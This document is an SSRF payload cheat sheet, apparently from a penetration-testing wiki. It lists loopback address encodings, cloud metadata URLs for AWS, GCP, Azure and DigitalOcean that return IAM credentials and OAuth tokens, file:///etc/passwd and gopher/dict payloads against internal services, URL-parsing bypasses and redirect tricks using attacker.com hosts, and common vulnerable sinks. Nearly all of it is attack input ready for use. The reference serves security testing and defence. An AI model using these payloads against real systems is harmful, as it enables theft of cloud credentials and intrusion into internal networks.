# SSRF Payloads

Quick reference for Server-Side Request Forgery.

## Localhost Variations

```
http://127.0.0.1
http://localhost
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
http://127.0.0.1.nip.io
http://localtest.me
http://127.127.127.127
http://2130706433 (decimal)
http://0x7f000001 (hex)
http://017700000001 (octal)
```

## Cloud Metadata Endpoints

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Header required: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Header required: `Metadata: true`

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

## Protocol Handlers

```
file:///etc/passwd
file:///c:/windows/win.ini
dict://localhost:11211/info
gopher://localhost:6379/_INFO
sftp://attacker.com/
tftp://attacker.com/file
ldap://localhost:389/%0astats%0aquit
```

## URL Bypass Techniques

### DNS Rebinding

```
http://spoofed.burpcollaborator.net
http://1.1.1.1.1p.io  (resolves to 1.1.1.1)
```

### URL Parsing Confusion

```
http://attacker.com#@trusted.com
http://trusted.com@attacker.com
http://attacker.com%2f%2f.trusted.com
http://attacker.com\.trusted.com
http://trusted.com.attacker.com
```

### Redirect-based

```
http://your-server.com/redirect?url=http://169.254.169.254/
```

### IPv6 Bypass

```
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

## Common SSRF Sinks

- Image URL parameters
- Webhook URLs
- PDF generators
- URL preview/unfurl
- Import from URL
- Proxy/redirect endpoints
- File download by URL

---

!!! info "Need more context?"
    See the full [SSRF methodology](../vulns/ssrf/index.md) for finding, exploiting, and escalating SSRF.
